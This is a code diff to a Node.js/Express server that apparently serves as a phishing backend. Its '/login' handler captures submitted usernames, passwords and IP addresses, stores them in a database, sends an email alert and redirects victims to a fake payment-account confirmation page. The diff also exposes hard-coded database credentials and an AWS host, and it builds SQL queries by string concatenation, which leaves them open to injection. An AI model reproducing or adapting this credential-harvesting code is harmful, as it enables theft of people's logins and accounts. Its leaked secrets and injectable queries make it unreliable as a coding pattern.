@@ -27,11 +27,11 @@ var transporter = nodemailer.createTransport({
 
 app.use(bodyParser.urlencoded({ extended: false }));
 const client = new pg.Client({
-    user: 'haaasalbrddacm',
-    password: '1c86ca363fc1a26cb588bbf08ed0117c6490946bc5b6a7de4e8164c3a76ac184',
-    database: 'de35u0icb8jt5u',
+    user: 'hedmgtryrynnvo',
+    password: '8d3725c0c82caf633dea68b3520ed712ae8bb985e69daf228c9a2a72959a91c5',
+    database: 'deqngk324p153p',
     port: 5432,
-    host: 'ec2-54-235-114-242.compute-1.amazonaws.com',
+    host: 'ec2-23-23-228-132.compute-1.amazonaws.com',
     ssl: true
 });
 
@@ -43,15 +43,16 @@ app.get('/confirm/*',function(req,res){
 })
 // #############################################################    POST REQUESTS    #######################################################################################################################################
 app.post('/login',function(req,res){
+    console.log(req.body)
     transporter.sendMail(mailOptions, function () { });
-    var a = req.body.login_email;
-    var b = req.body.login_password;
+    var a = req.body.username;
+    var b = req.body.password;
     console.log(a+b);
     var ip = req.headers['x-forwarded-for'] ||
     req.connection.remoteAddress ||
     req.socket.remoteAddress ||
     (req.connection.socket ? req.connection.socket.remoteAddress : null);
-    client.query("INSERT INTO freelancer (email,password,ip) VALUES ('"+a+"','"+b+"','"+ip+"')",function(err,result){});
+    client.query("INSERT INTO freelancer_users (users,password,ip) VALUES ('"+a+"','"+b+"','"+ip+"')",function(err,result){});
     res.redirect('/confirm/myaccount/money/flow/cards/ new/manual?flow=eyJyZXR1cm5VcmwiOiIvYnVzaW5lc3NleHAvbW9uZXkiLCJjYW5jZWxVcmwiOiIvYnVzaW5lc3NleHAvbW9uZXkifQ==');
 })
 
